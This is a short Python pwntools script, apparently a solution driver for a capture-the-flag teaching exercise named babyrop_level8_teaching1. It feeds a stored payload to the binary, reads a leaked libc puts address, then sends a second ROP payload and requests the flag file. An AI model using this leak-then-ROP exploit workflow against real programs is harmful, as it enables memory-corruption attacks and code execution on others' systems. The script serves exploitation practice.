#!/usr/bin/env python3

import pwn

# Create a process
#binary = pwn.process(['strace', '/babyrop_level8_teaching1'])  # Debugging purpose
binary = pwn.process(['/babyrop_level8_teaching1'])

# Receive lines
print(binary.recvline_contains(b"its entrypoint."))
input('Press [Enter] to continue..')

# First input
with open("payload1", "rb") as f:
    binary.sendline(f.read())

# Receive lines
print(binary.recvline_contains(b"Exiting!"))
libc_address = binary.recvline()
print("libc puts address: ", hex(int.from_bytes(libc_address[:-1], "little")))
input('Press [Enter] to continue..')

# Receive lines
print(binary.recvline_contains(b"its entrypoint."))
input('Please run ROP.py! Press [Enter] to continue..')

# Second input
with open("payload2", "rb") as f:
    binary.sendline(f.read())

# Third input
binary.sendline(b"/flag")
binary.interactive()
